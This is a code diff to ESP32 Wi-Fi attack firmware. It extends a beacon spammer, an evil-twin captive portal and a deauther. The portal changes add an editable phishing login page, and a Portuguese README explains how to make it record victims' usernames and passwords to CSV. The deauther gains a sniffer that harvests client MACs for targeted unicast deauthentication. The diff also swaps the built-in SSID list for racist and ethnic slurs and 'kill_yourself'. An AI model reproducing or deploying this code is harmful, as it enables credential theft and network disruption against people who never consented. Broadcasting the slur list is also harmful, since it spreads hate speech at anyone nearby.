@@ -23,7 +23,8 @@ static inline uint32_t wifiStaScanMsPerChannel() {
 }
 
 namespace Deauther {
-  extern void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size);
+  extern esp_err_t wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size,
+                                               wifi_interface_t iface = WIFI_IF_AP);
 }
 
 #ifdef TFT_BLACK
@@ -743,6 +744,22 @@ static void ptmDrawWaitCard() {
   tft.setTextColor(UI_TEXT, FEATURE_BG);
 }
 
+/* Called when the feature is left, from both dispatch sites.
+ *
+ * The exit branches in ptmLoop() are not reached on a touch exit: the tap
+ * is latched inside runUI(), after ptmLoop()'s own check has already read
+ * the latch as clear, and ptmLoop()'s second check tests
+ * feature_exit_requested, which the touch path does not set. The dispatch
+ * then breaks on the latch. Without this, leaving Packet Monitor leaves the
+ * radio promiscuous and the pcap open and still being written.
+ *
+ * Safe to call twice; pcapStop() is idempotent. */
+void ptmTeardown() {
+  esp_wifi_set_promiscuous(false);
+  pcapStop();
+  s_ptmHwReady = false;
+}
+
 void ptmSetup() {
   pauseBackgroundRadioTasks();
   setTouchButtonInputEnabled(true);
@@ -914,6 +931,15 @@ void ptmLoop() {
   deauths = 0;
   rssiSum = 0;
   }
+
+// IMPROVEMENT: Cleanup handler
+void exit() {
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  Serial.println("[WiFi] PacketMonitor exit: promisc disabled, radio reset");
+}
 }
 
 namespace BeaconSpammer {
@@ -924,19 +950,78 @@ bool btnSelectPress;
 bool btnDownPress;
 
 static const char* ssidList[] = {
-  "404_SSID_Not_Found", "Free_WiFi_Promise", "PrettyFlyForAWiFi", "Wi-Fight_The_Power",
-  "Tell_My_WiFi_LoveHer", "Wu-Tang_LAN", "LAN_of_the_Free", "No_More_Data",
-  "Panic!_At_the_WiFi", "HideYoKidsHideYoWiFi", "Definitely_Not_A_Spy", "Click_and_Die",
-  "DropItLikeItsHotspot", "Loading...", "I_AM_Watching_You", "Why_Tho?",
-  "Get_Your_Own_WiFi", "NSA_Surveillance_Van", "WiFi_Fairy", "Undercover_Potato",
-  "TheLANBeforeTime", "ItHurtsWhen_IP", "IPFreely", "NoInternetHere",
-  "LookMaNoCables", "Router?IHardlyKnewHer", "ShutUpAndConnect", "Mom_UseThisOne",
-  "Not_for_You", "OopsAllSSID", "ItsOver9000", "Bob's_Wifi_Burgers",
-  "Overclocked_Toaster", "Pikachu_Used_WiFi", "Cheese_Bandit", "Quantum_Tunnel",
-  "Meme_LANd"
+  "Fuck_Niggers", "Fuck_Pakis", "Fuck_Indians", "Fuck_browns",
+  "Fuck_Turks", "Zigeunerpack", "Brown_like_shit", "Go_home",
+  "third-world_scum", "fat_brown_cow", "Allah_is_homo", "Islam_for_gays",
+  "Pajeet", "brown_streetshitter", "I_AM_Watching_You", "Brown_Kamin",
+  "Get_Your_Own_WiFi", "subhuman", "scum", "cow_fucker",
+  "back_to_africa", "cockroach_muncher", "brown_menace", "shiteater",
+  "LookMaNoCables", "niggerniggernigger", "ShutUpAndConnect", "fuck_brown_scum",
+  "Not_for_You", "indian_scum", "kill_yourself", "filthy_pakis",
+  "third_world_shithole", "white_power", "filthy_kanaks", "kanacken_raus",
+  "arab_scum"
 };
 
 static const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);
+
+// ── Custom SSID list from SD (/ssid_list.txt) ──────────────────────────────
+// Optional: one SSID per line (<=32 chars, blank lines ignored). When present
+// with >=1 valid name it replaces the built-in array; otherwise we fall back
+// to ssidList[] above. SD is mounted via the shared isSDCardAvailable() helper
+// so the SPI-bus hand-off (SD shares the bus with the NRF24 radio) is honored.
+#ifndef BEACON_SD_MAX_SSIDS
+#define BEACON_SD_MAX_SSIDS 64
+#endif
+static String s_sdSsids[BEACON_SD_MAX_SSIDS];
+static int    s_sdSsidCount = 0;
+static bool   s_usingSdList = false;
+
+static inline int activeSsidCount() {
+  return s_usingSdList ? s_sdSsidCount : ssidCount;
+}
+static inline const char* activeSsid(int i) {
+  return s_usingSdList ? s_sdSsids[i].c_str() : ssidList[i];
+}
+
+// Returns number of names loaded from SD (0 = keep built-in list).
+static int loadSsidListFromSd() {
+  s_usingSdList = false;
+  s_sdSsidCount = 0;
+
+  if (!isSDCardAvailable()) {
+    Serial.println("[Beacon] SD not available; using built-in SSID list");
+    return 0;
+  }
+  if (!SD.exists("/ssid_list.txt")) {
+    Serial.println("[Beacon] /ssid_list.txt not found; using built-in SSID list");
+    return 0;
+  }
+  File f = SD.open("/ssid_list.txt", FILE_READ);
+  if (!f) {
+    Serial.println("[Beacon] could not open /ssid_list.txt; using built-in list");
+    return 0;
+  }
+
+  int n = 0;
+  while (f.available() && n < BEACON_SD_MAX_SSIDS) {
+    String line = f.readStringUntil('\n');
+    line.replace("\r", "");
+    line.trim();
+    if (line.length() == 0) continue;
+    if (line.length() > 32) line = line.substring(0, 32);
+    s_sdSsids[n++] = line;
+  }
+  f.close();
+
+  if (n >= 1) {
+    s_sdSsidCount = n;
+    s_usingSdList = true;
+    Serial.printf("[Beacon] loaded %d SSID(s) from /ssid_list.txt\n", n);
+  } else {
+    Serial.println("[Beacon] /ssid_list.txt empty; using built-in SSID list");
+  }
+  return n;
+}
 
 uint8_t spamchannel = 1;
 bool    spam        = false;
@@ -1124,7 +1209,7 @@ void output() {
   printLine(110 + y_offset, UI_TEXT, "[*] Starting broadcast");
   delay(150);
 
-  const int maxLines = min(ssidCount, min(18, spamMaxListLines()));
+  const int maxLines = min(activeSsidCount(), min(18, spamMaxListLines()));
   for (int i = 0; i < maxLines; i++) {
     const int y = 130 + i * 10 + y_offset;
     if (!spamYFits(y, 10)) {
@@ -1133,7 +1218,7 @@ void output() {
     tft.setTextColor(WHITE, TFT_BLACK);
     tft.setCursor(2, y);
     tft.print("[+] ");
-    tft.print(ssidList[i]);
+    tft.print(activeSsid(i));
     delay(40);
   }
 
@@ -1145,9 +1230,10 @@ void spammer() {
     spamchannel = 1;
   }
 
-  const int idx = s_ssidIdx % ssidCount;
-  s_ssidIdx = (uint8_t)((s_ssidIdx + 1) % ssidCount);
-  const char* ssid = ssidList[idx];
+  const int count = activeSsidCount();
+  const int idx = s_ssidIdx % count;
+  s_ssidIdx = (uint8_t)((s_ssidIdx + 1) % count);
+  const char* ssid = activeSsid(idx);
 
   // Stable locally-administered MAC per SSID index so phones keep distinct APs.
   uint8_t mac[6] = {
@@ -1227,7 +1313,7 @@ void beaconSpam() {
         channel = (uint8_t)random(1, kMaxChannel + 1);
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-        const char* ssid = ssidList[floodIdx % ssidCount];
+        const char* ssid = activeSsid(floodIdx % activeSsidCount());
         floodIdx++;
 
         uint8_t mac[6] = {
@@ -1382,6 +1468,9 @@ void beaconSpamSetup() {
   setTouchButtonInputEnabled(true);
   spam = false;
   s_ssidIdx = 0;
+
+  // Load custom names from /ssid_list.txt on SD (falls back to built-in list).
+  loadSsidListFromSd();
   if (spamchannel < 1 || spamchannel > kMaxChannel) {
     spamchannel = 1;
   }
@@ -1510,6 +1599,13 @@ void beaconSpamLoop() {
     }
     spammer();
   }
+}
+
+// IMPROVEMENT: Cleanup handler
+void exit() {
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  Serial.println("[WiFi] BeaconSpammer exit: stopped, radio reset");
 }
 }
 
@@ -2384,6 +2480,234 @@ void startWiFiScan() {
   displayWiFiList(true);
 }
 
+/* ───────────────── Live RSSI history graph (network detail view) ─────────────────
+ * While the detail screen is open we repeatedly do a fast, single-channel passive
+ * scan of just the selected AP and plot its RSSI over time, so you can walk around
+ * and watch the signal rise and fall on a scrolling history trace. The single-channel
+ * scan replaces the driver's cached list with a one-channel subset, so on leaving the
+ * detail view we rebuild the full list and re-select the network we were viewing.
+ */
+static const int      kRssiHistLen = 198;      // one stored sample per plot column
+static int8_t         s_rssiHist[kRssiHistLen];
+static int            s_rssiHistCount = 0;      // valid samples so far (<= len)
+static int            s_rssiHistHead  = 0;      // ring-buffer write index
+static uint8_t        s_liveBssid[6]  = {0};
+static uint8_t        s_liveChannel   = 0;
+static bool           s_liveActive    = false;
+static uint32_t       s_liveLastMs    = 0;
+static const uint32_t kLiveSampleMs   = 400;    // sample cadence
+static const uint16_t kLiveDwellMs    = 200;    // per-scan listen time (ms) — long
+                                                // enough to reliably catch a ~100 ms
+                                                // beacon interval on the target channel
+static const int      kRssiLost       = -100;   // sentinel: AP not heard this round
+
+// A passive scan can miss a single beacon window even when the AP is well in range,
+// which used to flip the readout to "-- lost --" and dive the trace to the floor on
+// every transient miss. Hold the last good reading for a few rounds and only declare
+// the AP lost after this many consecutive misses.
+static const int      kLostAfterMisses = 3;     // ~1.2 s of real loss before "lost"
+static int            s_consecMiss     = 0;
+static int            s_lastGoodRssi   = kRssiLost;
+
+// Live "Signal %" and "Est. Distance" detail lines mirror the graph's sampling.
+// Distance is EMA-smoothed to tame RSSI jitter; on real loss both freeze and dim.
+static bool           s_fieldsInit     = false;
+static float          s_distEMA        = 0.0f;
+static float          s_shownSignal    = 0.0f;
+static float          s_shownDist      = 0.0f;
+
+// Plot geometry. Sits below the "Est. Distance" text (now y=150 after removing the
+// static RSSI line). Bottom stays clear of the touch nav bar, which reserves the
+// screen below y=293 on V2 (320 - TOUCH_NAV_BAR_H), and of the y=304 button tab bar.
+static const int kPlotX0     = 34;    // left edge of trace area
+static const int kPlotX1     = 232;   // right edge (newest sample)
+static const int kPlotY0     = 176;   // top    -> strong signal (kRssiStrong)
+static const int kPlotY1     = 288;   // bottom -> weak signal   (kRssiWeak)
+static const int kRssiStrong = -35;   // dBm mapped to kPlotY0
+static const int kRssiWeak   = -100;  // dBm mapped to kPlotY1
+
+// Detail-view text row layout — single source of truth for both displayWiFiDetails
+// (which prints the labels) and drawLiveFields (which overwrites Signal/Distance live),
+// so adding/reordering a row can't silently desync the two.
+static const int kDetailRowY0   = 50;   // y of the first row
+static const int kDetailRowStep = 20;   // row pitch
+enum { kRowSSID = 0, kRowBSSID, kRowSignal, kRowChannel, kRowEnc, kRowDist };
+static inline int detailRowY(int row) { return kDetailRowY0 + row * kDetailRowStep; }
+
+static int rssiToY(int rssi) {
+  if (rssi > kRssiStrong) rssi = kRssiStrong;
+  if (rssi < kRssiWeak)   rssi = kRssiWeak;
+  const long span = (long)(kRssiStrong - kRssiWeak);   // 65
+  const long frac = (long)(kRssiStrong - rssi);        // 0..span
+  return kPlotY0 + (int)((frac * (kPlotY1 - kPlotY0)) / span);
+}
+
+static void liveRssiPush(int rssi) {
+  s_rssiHist[s_rssiHistHead] = (int8_t)constrain(rssi, -120, 0);
+  s_rssiHistHead = (s_rssiHistHead + 1) % kRssiHistLen;
+  if (s_rssiHistCount < kRssiHistLen) s_rssiHistCount++;
+}
+
+// Single-channel passive scan of just the selected AP. Returns true and sets *out
+// when the target BSSID is heard this round.
+static bool liveRssiSample(int* out) {
+  // Passive scan restricted to the target's channel AND BSSID, so the driver only
+  // reports our AP (core >= 2.0.x supports the channel + bssid filter arguments).
+  int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true, /*passive=*/true,
+                            kLiveDwellMs, s_liveChannel, /*ssid=*/nullptr, s_liveBssid);
+  bool found = false;
+  for (int i = 0; i < n; i++) {
+    const uint8_t* b = WiFi.BSSID(i);
+    if (b && memcmp(b, s_liveBssid, 6) == 0) { *out = WiFi.RSSI(i); found = true; break; }
+  }
+  WiFi.scanDelete();
+  return found;
+}
+
+static void drawRssiGraph(bool fullFrame) {
+  if (fullFrame) {
+    tft.setTextSize(1);
+    tft.setTextColor(GREEN, TFT_BLACK);
+    tft.setCursor(10, kPlotY0 - 14);
+    tft.print("RSSI history (live)");
+    tft.drawRect(kPlotX0 - 1, kPlotY0 - 1,
+                 (kPlotX1 - kPlotX0) + 2, (kPlotY1 - kPlotY0) + 2, TFT_GRAY);
+    // dBm axis labels aligned to the gridlines drawn below (-50 / -70 / -90).
+    tft.setTextColor(TFT_GRAY, TFT_BLACK);
+    for (int gr = -50; gr >= -90; gr -= 20) {
+      char lb[6]; snprintf(lb, sizeof(lb), "%d", gr);
+      tft.setCursor(2, rssiToY(gr) - 3);
+      tft.print(lb);
+    }
+  }
+
+  // Clear interior, redraw faint gridlines.
+  tft.fillRect(kPlotX0, kPlotY0, kPlotX1 - kPlotX0, kPlotY1 - kPlotY0, TFT_BLACK);
+  for (int gr = -50; gr >= -90; gr -= 20) {
+    tft.drawFastHLine(kPlotX0, rssiToY(gr), kPlotX1 - kPlotX0, L_Dark);
+  }
+
+  // Trace: oldest on the left, newest at the right edge.
+  int prevX = -1, prevY = -1;
+  for (int k = 0; k < s_rssiHistCount; k++) {
+    const int idx  = (s_rssiHistHead - s_rssiHistCount + k + kRssiHistLen) % kRssiHistLen;
+    const int rssi = s_rssiHist[idx];
+    const int x    = kPlotX1 - s_rssiHistCount + k;
+    const int y    = rssiToY(rssi);
+    if (prevX >= 0) tft.drawLine(prevX, prevY, x, y, GREEN);
+    else            tft.drawPixel(x, y, GREEN);
+    prevX = x; prevY = y;
+  }
+
+  // Current reading readout — on the title row above the plot, so it never covers
+  // the newest trace samples (which ride near the top-right when signal is strong).
+  const int latest = (s_rssiHistCount > 0)
+      ? s_rssiHist[(s_rssiHistHead - 1 + kRssiHistLen) % kRssiHistLen] : 0;
+  char buf[16];
+  tft.setTextSize(1);
+  tft.fillRect(150, kPlotY0 - 15, 84, 12, TFT_BLACK);
+  if (s_rssiHistCount > 0 && latest > kRssiLost) {
+    snprintf(buf, sizeof(buf), "%d dBm", latest);
+    tft.setTextColor(ORANGE, TFT_BLACK);
+  } else {
+    snprintf(buf, sizeof(buf), "-- lost --");
+    tft.setTextColor(TFT_RED, TFT_BLACK);
+  }
+  tft.setCursor(178, kPlotY0 - 14);
+  tft.print(buf);
+}
+
+// Begin live sampling for the network shown on the detail screen.
+static void liveRssiStart(const uint8_t* bssid, int channel, int seedRssi) {
+  if (!bssid) { s_liveActive = false; return; }  // stale/empty scan cache — no target
+  memcpy(s_liveBssid, bssid, 6);
+  s_liveChannel   = (uint8_t)channel;
+  s_rssiHistCount = 0;
+  s_rssiHistHead  = 0;
+  s_consecMiss    = 0;
+  s_lastGoodRssi  = seedRssi;
+  s_fieldsInit    = false;    // reset distance smoothing for the new network
+  liveRssiPush(seedRssi);     // seed with the cached reading so the graph isn't empty
+  s_liveActive = true;
+  s_liveLastMs = 0;           // force an immediate first sample
+  drawRssiGraph(/*fullFrame=*/true);
+}
+
+static void liveRssiStop() { s_liveActive = false; }
+
+// Redraw the "Signal %" and "Est. Distance" detail lines from the current live RSSI
+// (y positions match the layout in displayWiFiDetails). Distance is EMA-smoothed; on
+// real loss both freeze at their last value and dim (drawn in gray).
+static void drawLiveFields(int rssi, bool lost) {
+  const int SIGNAL_Y = detailRowY(kRowSignal);
+  const int DIST_Y   = detailRowY(kRowDist);
+  uint16_t col;
+  if (!lost) {
+    const float sig  = constrain(2 * (rssi + 100), 0, 100);
+    const float dist = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));
+    if (!s_fieldsInit) { s_distEMA = dist; s_fieldsInit = true; }
+    else               { s_distEMA = 0.3f * dist + 0.7f * s_distEMA; }  // light smoothing
+    s_shownSignal = sig;
+    s_shownDist   = s_distEMA;
+    col = WHITE;
+  } else {
+    col = TFT_GRAY;   // frozen + dimmed
+  }
+  tft.setTextSize(1);
+  tft.setTextColor(col, TFT_BLACK);
+  tft.fillRect(10, SIGNAL_Y - 1, 200, 10, TFT_BLACK);
+  tft.setCursor(10, SIGNAL_Y);
+  tft.print("Signal: "); tft.print(s_shownSignal, 0); tft.print("%");
+  tft.fillRect(10, DIST_Y - 1, 200, 10, TFT_BLACK);
+  tft.setCursor(10, DIST_Y);
+  tft.print("Est. Distance: "); tft.print(s_shownDist, 1); tft.print("m");
+}
+
+// Called every loop tick while the detail view is open.
+static void liveRssiTick() {
+  if (!s_liveActive) return;
+  const uint32_t now = millis();
+  if (s_liveLastMs != 0 && (now - s_liveLastMs) < kLiveSampleMs) return;
+  s_liveLastMs = now;
+  int r = 0;
+  bool lost = false;
+  int displayRssi = s_lastGoodRssi;
+  if (liveRssiSample(&r)) {
+    s_consecMiss   = 0;
+    s_lastGoodRssi = r;
+    displayRssi    = r;
+    liveRssiPush(r);
+  } else {
+    // Transient miss: hold the last good reading; only declare the AP lost after
+    // several consecutive misses so a single dropped beacon doesn't flicker "lost".
+    s_consecMiss++;
+    if (s_consecMiss >= kLostAfterMisses) {
+      lost = true;
+      liveRssiPush(kRssiLost);
+    } else {
+      displayRssi = s_lastGoodRssi;   // held
+      liveRssiPush(s_lastGoodRssi);
+    }
+  }
+  drawRssiGraph(/*fullFrame=*/false);
+  drawLiveFields(displayRssi, lost);
+}
+
+// After a full rescan, put the cursor back on the network we were viewing.
+static void wifiReselectByBssid(const uint8_t* bssid) {
+  const int n = WiFi.scanComplete();
+  if (n <= 0) return;
+  int sel = 0;
+  for (int i = 0; i < n; i++) {
+    const uint8_t* b = WiFi.BSSID(i);
+    if (b && memcmp(b, bssid, 6) == 0) { sel = i; break; }
+  }
+  currentIndex   = sel;
+  current_page   = currentIndex / max(1, wifiNetworksPerPage());
+  listStartIndex = current_page * wifiNetworksPerPage();
+  displayWiFiList(true);
+}
+
 void displayWiFiDetails() {
   uiDrawn = false;
   wifiScanClearBody();
@@ -2403,7 +2727,6 @@ void displayWiFiDetails() {
   int channel = WiFi.channel(currentIndex);
   int encryption = WiFi.encryptionType(currentIndex);
   bool isHidden = (ssid.length() == 0);
-  int y = 50;
 
   float signalQuality = constrain(2 * (rssi + 100), 0, 100);
   float estimatedDistance = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));
@@ -2424,32 +2747,28 @@ void displayWiFiDetails() {
   tft.setTextColor(WHITE, TFT_BLACK);
   tft.setTextSize(1);
 
-  tft.setCursor(10, y);
+  tft.setCursor(10, detailRowY(kRowSSID));
   tft.print("SSID: "); tft.print(isHidden ? "(Hidden)" : ssid);
-  y += 20;
 
-  tft.setCursor(10, y);
+  tft.setCursor(10, detailRowY(kRowBSSID));
   tft.print("BSSID: "); tft.print(bssid);
-  y += 20;
 
-  tft.setCursor(10, y);
-  tft.print("RSSI: "); tft.print(rssi); tft.print(" dBm");
-  y += 20;
+  // (Static "RSSI:" line removed — the live graph below shows RSSI in real time.)
 
-  tft.setCursor(10, y);
+  tft.setCursor(10, detailRowY(kRowSignal));
   tft.print("Signal: "); tft.print(signalQuality); tft.print("%");
-  y += 20;
 
-  tft.setCursor(10, y);
+  tft.setCursor(10, detailRowY(kRowChannel));
   tft.print("Channel: "); tft.print(channel);
-  y += 20;
 
-  tft.setCursor(10, y);
+  tft.setCursor(10, detailRowY(kRowEnc));
   tft.print("Encryption: "); tft.print(encryptionType);
-  y += 20;
 
-  tft.setCursor(10, y);
+  tft.setCursor(10, detailRowY(kRowDist));
   tft.print("Est. Distance: "); tft.print(estimatedDistance, 1); tft.print("m");
+
+  // Live scrolling RSSI history graph under the details.
+  liveRssiStart(WiFi.BSSID(currentIndex), channel, rssi);
 
   drawTabBar("Rescan", false, "", true, "Back", false);
 }
@@ -2680,6 +2999,7 @@ void wifiscanSetup() {
 void wifiscanLoop() {
 
   if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+    liveRssiStop();   // leaving the feature from the detail view: stop live sampling
     feature_exit_requested = true;
     return;
   }
@@ -2698,7 +3018,14 @@ void wifiscanLoop() {
       lastScanning = true;
     }
   } else if (!isDetailView) {
-    if (lastDetailView || lastScanning) {
+    if (lastDetailView) {
+      // Returning from the detail view: the live single-channel RSSI scans left the
+      // driver holding only that channel's APs. Rebuild the full multi-channel list
+      // and re-select the network we were just viewing.
+      liveRssiStop();
+      startWiFiScan();
+      wifiReselectByBssid(s_liveBssid);
+    } else if (lastScanning) {
       displayWiFiList(true);
     }
     lastDetailView = false;
@@ -2706,10 +3033,20 @@ void wifiscanLoop() {
   } else {
     if (!lastDetailView) {
       displayWiFiDetails();
+    } else {
+      liveRssiTick();
     }
     lastDetailView = true;
     }
   }
+
+// IMPROVEMENT: Cleanup handler
+void exit() {
+  WiFi.scanDelete();
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  Serial.println("[WiFi] WifiScan exit: scan stopped, radio reset");
+}
 }
 
 namespace CaptivePortal {
@@ -2984,6 +3321,123 @@ static bool cpAppendLineToFile(const char* path, const String& line) {
   return ok;
 }
 
+// --- SD-editable captive portal page -----------------------------------------
+// Mirrors the Beacon "/ssid_list.txt" pattern: the login page is seeded to the
+// SD card on first run (so there is a file to edit) and reloaded from there on
+// every run, falling back to the built-in page if the SD/file is unavailable.
+static const char* kCpPagePath   = "/captive_portal/login.html";
+static const char* kCpReadmePath = "/captive_portal/README.txt";
+
+static const char kCpReadmeText[] = R"RDME(ESP32-DIV - Captive Portal: pagina editavel
+===========================================================
+
+ARQUIVO DA PAGINA
+-----------------
+  /captive_portal/login.html
+
+Edite esse arquivo (qualquer editor de texto) para mudar a APARENCIA da
+pagina mostrada ao alvo. Ele foi criado automaticamente na primeira vez, com
+a pagina padrao, so para voce ter um ponto de partida.
+
+- Mexa a vontade no HTML/CSS: cores, textos, layout, logo (imagem em base64
+  embutida funciona, sem depender de internet).
+- Se o arquivo faltar, estiver vazio ou o SD nao montar, o firmware usa a
+  pagina embutida (fallback). Nada quebra.
+- Salve e recoloque o cartao. Nao precisa recompilar nada.
+
+CONTRATO OBRIGATORIO (para os dados digitados serem registrados)
+----------------------------------------------------------------
+O firmware so captura o que for enviado EXATAMENTE assim:
+
+  1. Formulario que faz POST para /login :
+        <form action='/login' method='POST'> ... </form>
+  2. Campo de senha com name="password" :
+        <input type='password' name='password'>
+  3. (Opcional) campo de usuario com name="username" :
+        <input type='text' name='username'>
+  4. Um submit dentro do form:
+        <button type='submit'>Entrar</button>
+
+Se voce renomear os campos (ex.: name='senha') ou mudar o action, o dado
+NAO sera registrado. Os nomes username/password e o action /login sao fixos
+no firmware.
+
+ONDE OS DADOS FICAM
+-------------------
+Cada envio e gravado em:
+  /captive_portal/captured.csv
+Colunas: millis,remote_ip,ssid,username,password
+(Tambem salvos na EEPROM, exportaveis pela tela do aparelho.)
+
+EXEMPLO MINIMO QUE FUNCIONA
+---------------------------
+  <!DOCTYPE html><html><head><meta name='viewport'
+    content='width=device-width, initial-scale=1'></head><body>
+    <h1>Minha pagina</h1>
+    <form action='/login' method='POST'>
+      <input type='text' name='username' placeholder='Usuario'><br>
+      <input type='password' name='password' placeholder='Senha' required><br>
+      <button type='submit'>Entrar</button>
+    </form>
+  </body></html>
+
+USO AUTORIZADO
+--------------
+Apenas em laboratorio/equipamentos proprios ou com autorizacao explicita,
+para estudo e defesa. Nao use contra terceiros.
+)RDME";
+
+static bool cpWriteFileIfMissing(const char* path, const String& content) {
+  if (!cpMountSD()) return false;
+  if (SD.exists(path)) return true;          // never overwrite the user's edits
+  File f = SD.open(path, "w");
+  if (!f) {
+    cp_sd_mounted = false;
+    if (!cpMountSD()) return false;
+    f = SD.open(path, "w");
+    if (!f) return false;
+  }
+  f.print(content);
+  f.flush();
+  f.close();
+  return true;
+}
+
+// Seed login.html (with the current built-in page) and README.txt on first run.
+static void cpSeedPortalFilesOnSD() {
+  if (!cpEnsureDir("/captive_portal")) {
+    Serial.println("[SD] /captive_portal unavailable; built-in portal page");
+    return;
+  }
+  if (cpWriteFileIfMissing(kCpPagePath, loginPage)) {
+    Serial.printf("[SD] editable portal page at %s\n", kCpPagePath);
+  }
+  cpWriteFileIfMissing(kCpReadmePath, String(kCpReadmeText));
+}
+
+// Load the (possibly user-edited) page from SD into loginPage; fall back to the
+// built-in default on any problem.
+static void cpLoadLoginPageFromSD() {
+  if (!cpMountSD())            { Serial.println("[SD] not mounted; built-in portal page"); return; }
+  if (!SD.exists(kCpPagePath)) { Serial.println("[SD] login.html missing; built-in portal page"); return; }
+  File f = SD.open(kCpPagePath, FILE_READ);
+  if (!f)                      { Serial.println("[SD] cannot open login.html; built-in portal page"); return; }
+
+  String html;
+  html.reserve(f.size() + 1);
+  while (f.available()) html += (char)f.read();
+  f.close();
+
+  if (html.length() < 20) {    // too small to be a real page -> keep default
+    Serial.println("[SD] login.html empty/too small; built-in portal page");
+    return;
+  }
+  loginPage = html;
+  Serial.printf("[SD] loaded portal page from %s (%u bytes)\n",
+                kCpPagePath, (unsigned)loginPage.length());
+  displayPrint("Portal page loaded from SD", GREEN, false);
+}
+
 static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, const String& passwordStr, const String& ssid) {
   const char* dir = "/captive_portal";
   const char* path = "/captive_portal/captured.csv";
@@ -3091,7 +3545,6 @@ static void cpSendDeauthFrame() {
   memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
   memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
   memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
-  cp_deauth_frame[26] = 7;
   Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);
 
   memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
@@ -3099,7 +3552,6 @@ static void cpSendDeauthFrame() {
   memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
 
   memset(&cp_deauth_frame[4], 0xFF, 6);
-  cp_deauth_frame[26] = 7;
   Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);
 
   cp_deauth_packet_count += 2;
@@ -4163,6 +4615,10 @@ void cportalSetup() {
   }
   loadSSID();
 
+  // Seed (first run) + load the SD-editable login page; falls back to built-in.
+  cpSeedPortalFilesOnSD();
+  cpLoadLoginPageFromSD();
+
   startAttack();
 
   drawMainMenu();
@@ -4237,6 +4693,10 @@ uint8_t deauth_frame[sizeof(deauth_frame_default)];
 uint32_t packet_count = 0;
 uint32_t success_count = 0;
 uint32_t consecutive_failures = 0;
+// On-screen diagnostics (serial is unavailable on this S3 build).
+uint32_t s_txNoMem = 0;     // esp_wifi_80211_tx returned ESP_ERR_NO_MEM (queue full)
+int32_t  s_lastTxErr = 0;   // last esp_wifi_80211_tx error that wasn't OK/NO_MEM
+uint32_t s_rearmCount = 0;  // times the stall watchdog re-armed the radio
 bool attack_running = false;
 wifi_ap_record_t selectedAp;
 uint8_t selectedChannel;
@@ -4247,6 +4707,77 @@ bool scanning = false;
 uint32_t last_packet_time = 0;
 int current_page = 0;
 int currentIndex = 0;
+
+// ---- Targeted (unicast) deauth: learn associated clients, then kick each ----
+// Broadcast deauth (dest FF:FF:..) is widely ignored by modern clients; a
+// unicast deauth addressed to the client's own MAC is what actually kicks it.
+// We run promiscuous RX on the target channel alongside the SoftAP TX (the same
+// combo HiddenSsidReveal uses) to harvest the stations talking to the target.
+static const int kMaxDeauthClients = 32;
+static uint8_t s_deauthClients[kMaxDeauthClients][6];
+static volatile int s_deauthClientCount = 0;
+
+static bool deauthMacBroadcastOrZero(const uint8_t* m) {
+    bool allF = true, allZero = true;
+    for (int i = 0; i < 6; i++) {
+        if (m[i] != 0xFF) allF = false;
+        if (m[i] != 0x00) allZero = false;
+    }
+    return allF || allZero;
+}
+
+static void deauthAddClient(const uint8_t* mac) {
+    if (deauthMacBroadcastOrZero(mac)) return;
+    if (mac[0] & 0x01) return;  // skip multicast/group addresses
+    for (int i = 0; i < s_deauthClientCount; i++) {
+        if (memcmp(s_deauthClients[i], mac, 6) == 0) return;  // dedupe
+    }
+    if (s_deauthClientCount >= kMaxDeauthClients) return;
+    memcpy(s_deauthClients[s_deauthClientCount], mac, 6);
+    s_deauthClientCount++;
+}
+
+// Promiscuous RX: collect MACs of stations ASSOCIATED with the target BSSID.
+// Only DATA frames count: a data frame to/from the BSSID means a real, active
+// association. Management frames (esp. probe requests) use randomized MACs and
+// would flood the list with phantom "clients" that never actually connect.
+static void deautherSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (!feature_active || !attack_running) return;
+    if (type != WIFI_PKT_DATA) return;
+    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+    if (!pkt || !pkt->payload) return;
+    if (pkt->rx_ctrl.sig_len < 24) return;
+
+    const uint8_t* p = pkt->payload;
+    const uint8_t toDS   = p[1] & 0x01;
+    const uint8_t fromDS = p[1] & 0x02;
+    const uint8_t* a1 = p + 4;    // receiver
+    const uint8_t* a2 = p + 10;   // transmitter
+    const uint8_t* target = selectedAp.bssid;
+
+    if (toDS && !fromDS) {
+        // client -> AP : a1 = BSSID, a2 = client
+        if (memcmp(a1, target, 6) == 0) deauthAddClient(a2);
+    } else if (!toDS && fromDS) {
+        // AP -> client : a1 = client, a2 = BSSID
+        if (memcmp(a2, target, 6) == 0) deauthAddClient(a1);
+    }
+    // WDS (toDS&&fromDS) and IBSS (neither) are not infrastructure clients.
+}
+
+static void deautherStartSniffer() {
+    s_deauthClientCount = 0;
+    wifi_promiscuous_filter_t filt;
+    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(&deautherSniffer);
+    esp_wifi_set_promiscuous(true);
+}
+
+static void deautherStopSniffer() {
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+}
 
 static void deautherUpdateNavLabels(bool onAttackScreen) {
   if (!featureHasTouchNavBar()) {
@@ -4281,6 +4812,34 @@ static void deautherDrawApRow(int i, int y, bool isSel) {
   tft.println(buf);
 }
 
+// Put the radio in STA + promiscuous (monitor) mode on the target channel and
